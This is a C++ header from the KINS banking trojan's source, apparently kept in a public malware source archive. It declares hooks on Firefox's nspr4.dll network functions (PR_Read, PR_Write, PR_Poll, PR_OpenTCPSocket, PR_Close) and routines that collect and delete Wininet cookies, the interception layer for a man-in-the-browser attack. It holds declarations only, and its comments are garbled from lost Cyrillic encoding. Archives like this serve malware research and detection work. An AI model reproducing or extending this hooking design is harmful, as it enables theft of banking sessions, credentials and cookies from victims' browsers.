/*
  name      KINS
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
/*
  �������� nspr4.dll
*/
#pragma once


//PRFileDesc.
typedef struct
{
	void *methods;
	void *secret;
	void *lower, *higher;
	void ( *dtor)(void *fd);
	int identity;
}PRFILEDESC;

//PRPollDesc
typedef struct
{
	PRFILEDESC* fd;
	__int16 in_flags;  //PR_POLL_*.
	__int16 out_flags; //PR_POLL_*.
}PRPOLLDESC;

namespace Nspr4Hook
{
	/*
		�������������.

	*/
	void init(void);

	/*
		���������������.
	*/
	void uninit(void);

	/*
		��������� ����� Wininet.
	*/
	void _getCookies(void);

	/*
		�������� ����� Wininet.
	*/
	void _removeCookies(void);

	/*
		��������� ������� ������������ �������. ������� ������ ���������� � �������� ���� ���.

		IN module       - ������.
		IN readAddress  - ����� ������������ PR_Read.
		IN writeAddress - ����� ������������ PR_Write.
		IN pollAddress  - ����� ������������ PR_Poll.
	*/
	void updateAddresses(HMODULE moduleHandle, void *openTcpSocket, void *close, void *readAddress, void *writeAddress, void *pollAddress);

	/*
		hook for PR_OpenTCPSocket.
	*/
	void *__cdecl hookerPrOpenTcpSocket(int af);

	/*
		����������� PR_Close.
	*/
	int __cdecl hookerPrClose(void *fd);

	/*
		����������� PR_Read.
	*/
	__int32 __cdecl hookerPrRead(void *fd, void *buf, __int32 amount);

	/*
		����������� PR_Write.
	*/
	__int32 __cdecl hookerPrWrite(void *fd, const void *buf, __int32 amount);

	/*
		Hook for PR_Poll.
	*/
	__int32 __cdecl  hookerPrPoll(PRPOLLDESC *pds, int npds, unsigned __int32 timeout);

};
